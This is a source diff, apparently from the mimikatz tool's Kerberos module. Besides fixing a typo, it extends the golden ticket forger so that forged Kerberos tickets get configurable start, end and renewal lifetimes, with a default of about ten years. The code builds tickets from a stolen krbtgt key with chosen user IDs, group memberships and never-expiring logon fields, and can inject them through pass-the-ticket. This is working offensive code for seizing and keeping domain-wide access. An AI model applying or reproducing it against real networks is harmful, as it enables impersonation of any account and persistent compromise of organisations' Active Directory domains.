@@ -129,7 +129,7 @@ NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
 	BOOL isNull = FALSE;
 
 	status = LsaCallKerberosPackage(&kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
-	kprintf(L"Keberos TGT of current session : ");
+	kprintf(L"Kerberos TGT of current session : ");
 	if(NT_SUCCESS(status))
 	{
 		if(NT_SUCCESS(packageStatus))
@@ -258,11 +258,13 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
 	DWORD i, j, nbGroups, id = 500, keyType, keyLen, App_KrbCredSize;
-	PCWCHAR szUser, szDomain, szSid, szKey, szId, szGroups, base, filename;
+	PCWCHAR szUser, szDomain, szSid, szKey, szId, szGroups, szLifetime, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
+	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
+		
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");
 
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
@@ -344,6 +346,15 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 						if(kull_m_string_stringToHex(szKey, key, keyLen))
 						{
+							kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
+							GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
+							*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
+							lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
+							kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
+							*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+							kull_m_string_args_byName(argc, argv, L"renewin", &szLifetime, szLifetime);
+							*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+
 							kprintf(
 								L"User      : %s\n"
 								L"Domain    : %s\n"
@@ -355,9 +366,14 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							kprintf(L"\nkrbtgt    : ");
 								
 							kull_m_string_wprintf_hex(key, keyLen, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
+							kprintf(L"Lifetime  : ");
+								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
+								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
+								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
+							
 							kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, key, keyLen, keyType, id, groups, nbGroups))
+							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, &lifeTimeData, pSid, key, keyLen, keyType, id, groups, nbGroups))
 							{
 								App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
 								if(isPtt)
@@ -418,17 +434,14 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
+PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
 {
 	NTSTATUS status;
 	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
 	KIWI_KERBEROS_TICKET ticket = {0};
 	KERB_VALIDATION_INFO validationInfo = {0};
-	SYSTEMTIME st;
 	PPACTYPE pacType; DWORD pacTypeSize;
 	DWORD SignatureType;
-
-	GetSystemTime(&st); st.wMilliseconds = 0;
 
 	if(ticket.ClientName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */))
 	{
@@ -451,13 +464,11 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	ticket.Key.Length = keySize;
 	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
 		CDGenerateRandomBits(ticket.Key.Value, ticket.Key.Length);
-	SystemTimeToFileTime(&st, &ticket.StartTime);
-	st.wYear += 10;
-	SystemTimeToFileTime(&st, &ticket.EndTime);
-	st.wYear += 10; // just for lulz
-	SystemTimeToFileTime(&st, &ticket.RenewUntil);
-		
-	validationInfo.LogonTime = ticket.StartTime;
+	
+	validationInfo.LogonTime = ticket.StartTime = lifetime->TicketStart;
+	ticket.EndTime = lifetime->TicketEnd;
+	ticket.RenewUntil = lifetime->TicketRenew;
+	
 	KIWI_NEVERTIME(&validationInfo.LogoffTime);
 	KIWI_NEVERTIME(&validationInfo.KickOffTime);
 	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
